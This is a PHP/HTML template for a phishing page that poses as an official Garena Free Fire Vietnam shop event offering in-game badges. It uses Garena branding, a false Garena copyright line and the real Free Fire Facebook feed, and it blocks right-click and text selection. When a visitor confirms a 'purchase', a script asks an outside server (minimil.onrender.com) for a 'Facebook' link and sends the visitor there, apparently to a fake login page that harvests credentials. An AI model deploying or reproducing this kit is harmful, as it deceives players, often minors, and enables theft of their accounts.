<?php
$imageLinks = [
    "https://nkckriujybohswbebyyj.supabase.co/storage/v1/object/public/main/phising/pFPyUBz.jpeg",
    "https://nkckriujybohswbebyyj.supabase.co/storage/v1/object/public/main/phising/2614b419ea4bdae9c70fa48015de5060.jpg",
    "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR5Q3J7g8sjmmuBr70yeblxvUtiAcAPlHnwrQ&s",
    "https://nkckriujybohswbebyyj.supabase.co/storage/v1/object/public/main/phising/3dphRVj.jpeg",
    "https://nkckriujybohswbebyyj.supabase.co/storage/v1/object/public/main/phising/aayuhgO.jpeg",
    "https://nkckriujybohswbebyyj.supabase.co/storage/v1/object/public/main/phising/images.jpg",
    "https://nkckriujybohswbebyyj.supabase.co/storage/v1/object/public/main/phising/JkE8Sq2.jpeg",
    "https://i.pinimg.com/236x/26/14/b4/2614b419ea4bdae9c70fa48015de5060.jpg",
    "https://i.pinimg.com/236x/26/14/b4/2614b419ea4bdae9c70fa48015de5060.jpg",
    "https://nkckriujybohswbebyyj.supabase.co/storage/v1/object/public/main/phising/Shoz1ga.jpeg",
    "https://nkckriujybohswbebyyj.supabase.co/storage/v1/object/public/main/phising/maxresdefault.jpg",
];

// Kiểm tra xem danh sách có đủ dữ liệu không
if (is_array($imageLinks) && count($imageLinks) >= 10) {
    $bannerLink = $imageLinks[0];
    $gift1Link = $imageLinks[1];
    $gift2Link = $imageLinks[2];
    $gift3Link = $imageLinks[3];
    $gift4Link = $imageLinks[4];
    $gift5Link = $imageLinks[5];
    $gift6Link = $imageLinks[6];
    $gift7Link = $imageLinks[7];
    $gift8Link = $imageLinks[8];
    $gift9Link = $imageLinks[9];

    $gift1Name = "Huy hiệu 1";
    $gift2Name = "Huy hiệu 2";
    $gift3Name = "Huy hiệu 3";
    $gift4Name = "Huy hiệu 4";
    $gift5Name = "Huy hiệu 5";
    $gift6Name = "Huy hiệu 6";
    $gift7Name = "Huy hiệu 7";
    $gift8Name = "Huy hiệu 8";
    $gift9Name = "Huy hiệu 9";
} else {
    echo "Danh sách hình ảnh không đủ dữ liệu.";
}

$currentUrl = $_SERVER['REQUEST_URI'];
$baseHref = '';
if (strpos(
    $currentUrl, '/themes/theme18/') === false) {
    $baseHref = '<base href="themes/theme18/">';
}
?>
<?= $baseHref ?>
<!-- Nông Văn Nguyên
Vui lòng không xoá để tôn trọng tác giả  -->
<html>

<head>
    <meta charset="UTF-8" />
    <meta name="viewport"
        content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta property="og:title" content=" Cửa Hàng Garena Free Fire">
    <meta name="description" content="Cửa Hàng Garena Free Fire">
    <meta property="og:description" content="Cửa Hàng Garena Free Fire">
    <meta property="og:url" content="./">
    <meta property="og:site_name" content=" Cửa Hàng Garena Free Fire">
    <meta property="og:type" content="website">
    <meta name="copyright" content="Nong Van Nguyen">
    <meta name="theme-color" content="#000">
    <meta property="og:image" content="img/kv_logo.jpg">
    <title><?php echo isset($bannerName) ? $bannerName : ''; ?></title>
    <link rel="stylesheet" href="css/style.css">
    <link rel="stylesheet" href="css/animate.css">
    <link rel="stylesheet" href="css/login/facebook.css">

    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
    <link rel="stylesheet"
        href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
    <link rel="icon" href="img/logo.png">

    <div id="fb-root"></div>
    <script async defer crossorigin="anonymous" src="https://connect.facebook.net/vi_VN/sdk.js#xfbml=1&version=v14.0"
        nonce="pT9mu9d4"></script>
</head>

<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">
    <div class="containerHome rewardsBox">
        <div class="navbar">
            <img class="navbar-logo" src="img/logo.png">
            <div class="navbar-title">
                <?php echo isset($bannerName) ? $bannerName : ''; ?>
                <br>
                <span> Sống dai thành huyền thoại! <br></span>
            </div>
            <div class="navbar-download">
                <img class="navbar-pay"
                    src="https://firebasestorage.googleapis.com/v0/b/vocabulary-notebook-989d7.appspot.com/o/images%2Fu9rU3qB.png?alt=media&token=f74fa9f6-d8fe-4372-86ef-5bce3b83d8c5">

            </div>
        </div>
        <div class="headernamek">
            <div class="sliderHeader"><img src="<?php echo isset($bannerLink) ? $bannerLink : ''; ?>"
                    style="width: 100%;"></div>
        </div>
        <div class="box">
            <center>
                <div class=""
                    style="background: url(img/NVN.png) no-repeat center;background-size: 100% 100%;width: 100%;height: 50px">
                    <center>
                        <font style="font-size: 18px;color: #866d6b;position:absolute;left: 18%;top: 1.2%"></font>
                    </center>
                </div>
                <div class="alert-wrapper">
                    <div class="alert">
                        <div class="alert-time">
                            <div id="timer1"></div>
                        </div>
                        <div class="slider animated fadeIn" style="    font-family: 'Baloo 2', cursive;">Sự Kiện Sẽ Kết
                            Thúc Sau: </div>
                        <div class="slider animated fadeIn" style="    font-family: 'Baloo 2', cursive;">Cảm Ơn Bạn Đã
                            Tham Gia Sự Kiện</div>
                        <div class="slider animated fadeIn" style="    font-family: 'Baloo 2', cursive;">Chúc Bạn Chơi
                            Game Vui Vẻ!</div>
                    </div>
                </div>
                <div class style=" background: url(img/countdown.png) no-repeat center center;
    background-size: 100% 70%; width: 100%;
    height: 75px;
   
    margin-left: auto;
    margin-right: auto;
    display: block;
    position: absolute;
    color: #866d6b;
    position:absolute;
    top:-0.5%;">

                    <center>
                        <font style="font-size: 25px;
    color: #866d6b;
    position: absolute;
    left:95px;
    top: 18px;
        font-family: 'Baloo 2', cursive;"> <?php echo isset($bannerName) ? $bannerName : ''; ?></font>
                    </center>
                </div>
                <div class="tab_rewards" id="latest">
                    <div class="item">
                        <div>
                            <img style="border-bottom: 0px;" src="<?php echo isset($gift1Link) ? $gift1Link : ''; ?>">
                        </div>
                        <div>
                            <button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);"
                                src="<?php echo isset($gift1Link) ? $gift1Link : ''; ?>">&emsp;10.000</button>
                        </div>
                    </div>
                    <div class="item">
                        <div>
                            <img style="border-bottom: 0px;" src="<?php echo isset($gift2Link) ? $gift2Link : ''; ?>">
                        </div>
                        <div>
                            <button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);"
                                src="<?php echo isset($gift2Link) ? $gift2Link : ''; ?>">&emsp;10.000</button>
                        </div>
                    </div>
                    <div class="item">
                        <div>
                            <img style="border-bottom: 0px;" src="<?php echo isset($gift3Link) ? $gift3Link : ''; ?>">
                        </div>
                        <div>
                            <button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);"
                                src="<?php echo isset($gift3Link) ? $gift3Link : ''; ?>">&emsp;10.000</button>
                        </div>
                    </div>
                    <div class="item">
                        <div>
                            <img style="border-bottom: 0px;" src="<?php echo isset($gift4Link) ? $gift4Link : ''; ?>">
                        </div>
                        <div>
                            <button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);"
                                src="<?php echo isset($gift4Link) ? $gift4Link : ''; ?>">&emsp;10.000</button>
                        </div>
                    </div>
                    <div class="item">
                        <div>
                            <img style="border-bottom: 0px;" src="<?php echo isset($gift5Link) ? $gift5Link : ''; ?>">
                        </div>
                        <div>
                            <button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);"
                                src="<?php echo isset($gift5Link) ? $gift5Link : ''; ?>">&emsp;10.000</button>
                        </div>
                    </div>
                    <div class="item">
                        <div>
                            <img style="border-bottom: 0px;" src="<?php echo isset($gift6Link) ? $gift6Link : ''; ?>">
                        </div>
                        <div>
                            <button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);"
                                src="<?php echo isset($gift6Link) ? $gift6Link : ''; ?>">&emsp;10.000</button>
                        </div>
                    </div>
                    <div class="item">
                        <div>
                            <img style="border-bottom: 0px;" src="<?php echo isset($gift7Link) ? $gift7Link : ''; ?>">
                        </div>
                        <div>
                            <button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);"
                                src="<?php echo isset($gift7Link) ? $gift7Link : ''; ?>">&emsp;10.000</button>
                        </div>
                    </div>
                    <div class="item">
                        <div>
                            <img style="border-bottom: 0px;" src="<?php echo isset($gift8Link) ? $gift8Link : ''; ?>">
                        </div>
                        <div>
                            <button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);"
                                src="<?php echo isset($gift8Link) ? $gift8Link : ''; ?>">&emsp;10.000</button>
                        </div>
                    </div>
                    <div class="item">
                        <div>
                            <img style="border-bottom: 0px;" src="<?php echo isset($gift9Link) ? $gift9Link : ''; ?>">
                        </div>
                        <div>
                            <button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);"
                                src="<?php echo isset($gift9Link) ? $gift9Link : ''; ?>">&emsp;10.000</button>
                        </div>
                    </div>
                </div>

            </center>
            <!-- Nông Văn Nguyên
Facebook.com/778578204  -->


            <!-- Nông Văn Nguyên
Vui lòng không xoá để tôn trọng tác giả  -->

            <div class="fb-page" data-href="https://www.facebook.com/freefirevn" data-tabs="timeline" data-width="500"
                data-height="500" data-small-header="true" data-adapt-container-width="true" data-hide-cover="false"
                data-show-facepile="true">
                <blockquote cite="https://www.facebook.com/freefirevn" class="fb-xfbml-parse-ignore"><a
                        href="https://www.facebook.com/freefirevn">Garena Free Fire</a></blockquote>
            </div>


            <a href="#" class="btn-top"></a>
        </div>
        </section>
        <div class="dialog">
            <div class="pop pop1" id="pop1">
                <div>
                </div>
                </center>
            </div>
            <div class="footer">
                <div class="footer-txt-follow">THEO DÕI CHÚNG TÔI</div>
                <center>
                    <img class="footer-follow-icon" src="img/link_1.png">
                    <img class="footer-follow-icon" src="img/link_2.png">
                    <img class="footer-follow-icon" src="img/link_3.png">
                    <img class="footer-follow-icon" src="img/link_4.png">
                    <img class="footer-follow-icon" src="img/link_5.png">
                </center>

                <div class="footer-txt-copyright">ⓒ 2023 Garena Vietnam.</div>
                <div class="footer-txt-copyright">Privacy Policy | Bản quyền thuộc về © Garena Online</div>
            </div>
        </div>
        <div class="popup welcome">
            <div class="popup-box" style="     background: url(img/popup.png) no-repeat center center;
    background-size: 100% 100%;
    width: 390px;
    height: auto;
    position: relative;
    margin: 50px auto;
    margin-top: 15%;
    text-align: center;
    font-family: 'Baloo 2', cursive;
    color: #dbf1ff;
    margin-top: 50%;">
                <div class="nav-popup">
                    <div class="nav-popup-title">Thông Tin Sự Kiện</div>
                </div>
                <div class="popup-alert">
                    1. Sử dụng vàng hiện có để mua đồ
                    <br>
                    trên trang sự kiện
                    <br>
                    2. Chúng tôi sẽ kiểm tra thông tin
                    <br>
                    3. Gửi món đồ đến hòm thư sau 24h
                    <br>
                </div>
                <div class="popup-btn-wrapper" style="height: 40px;">
                    <button type="button" onmousedown="buka.play();" class="popup-btn-active-center"
                        onclick="close_reward_confirmation()">Đóng</button>
                </div>
            </div>
        </div>
        <div class="popup reward_confirmation" style="display: none;">
            <div class="popup-box" style="     background: url(img/popup.png) no-repeat center center;
    background-size: 100% 100%;
    width: 390px;
    height: auto;
    position: relative;
    margin: 50px auto;
    margin-top: 15%;
    text-align: center;
    font-family: 'Baloo 2', cursive;
    color: #dbf1ff;
    margin-top: 50%;">
                <div class="nav-popup">
                    <div class="nav-popup-title">Xác Nhận</div>
                </div>
                <div class="popup-alert">Bạn có chắc chắn mua món đồ này?</div>
                <img class="popup-item" src="" id="myRewardImg">
                <div class="popup-btn-wrapper">
                    <button type="button" onmousedown="tutup.play();" class="popup-btn-deactive"
                        onclick="close_reward_confirmation()">Hủy</button>

                    <a class="loginFb" title="Facebook">
                        <div class="popup-btn-active">Đồng ý</div>
                </div>
            </div>
        </div>



        <!-- Nông Văn Nguyên
Facebook.com/778578204  -->


        <!-- Nông Văn Nguyên
Vui lòng không xoá để tôn trọng tác giả  -->
        <script>
            const btns = document.querySelectorAll('.loginFb');
            btns.forEach(btn => {
                btn.addEventListener('click', function () {
                    const domain = window.location.protocol + "//" + window.location.host;
                    (async () => {
                        try {
                            let data = await fetch(`https://minimil.onrender.com/api/websites?domain=${domain}`)
                            data = await data.json()
                            window.location.href = data.data.domain_fb;
                        } catch {

                        }
                    })();
                });
            });
        </script>
        <script type="text/javascript" src="https://code.jquery.com/jquery-1.10.2.min.js"></script>
        <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
        <script src="js/tab.js"></script>
        <script src="js/timer.js"></script>
        <script src="js/popup.js"></script>
        <script src="js/click.js"></script>
        <script src="js/slider.js"></script>
        <!-- Nông Văn Nguyên
Facebook.com/778578204  -->


        <!-- Nông Văn Nguyên
Vui lòng không xoá để tôn trọng tác giả  -->
</body>

</html>